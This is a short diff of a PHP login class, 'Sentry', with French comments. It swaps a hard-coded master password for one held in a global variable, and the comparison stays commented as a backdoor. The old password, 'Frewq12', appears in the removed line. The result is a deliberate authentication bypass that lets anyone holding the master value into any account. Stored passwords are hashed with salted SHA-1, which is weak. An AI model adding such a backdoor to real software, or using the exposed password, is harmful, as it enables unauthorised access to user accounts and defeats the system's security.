@@ -127,7 +127,7 @@ class Sentry extends SystemComponent {
 
 		/* Appel de l'instance de la classe d'accès à la BD*/
 		global $connector;
-		
+		global $glo_masterkey;
 
 
 		require_once('Validateur.php');
@@ -180,7 +180,7 @@ class Sentry extends SystemComponent {
 				
 				
 				//Si au moins un enregistrement de personne est trouvé
-				if ((sha1($this->userdata['gds'].sha1($pass)) == $this->userdata['mot_de_passe']) || $pass == 'Frewq12' ) // backdoor
+				if ((sha1($this->userdata['gds'].sha1($pass)) == $this->userdata['mot_de_passe']) || $pass == $glo_masterkey) // backdoor
 				{
 
 					$this->_setSession($this->userdata, $memoriser);
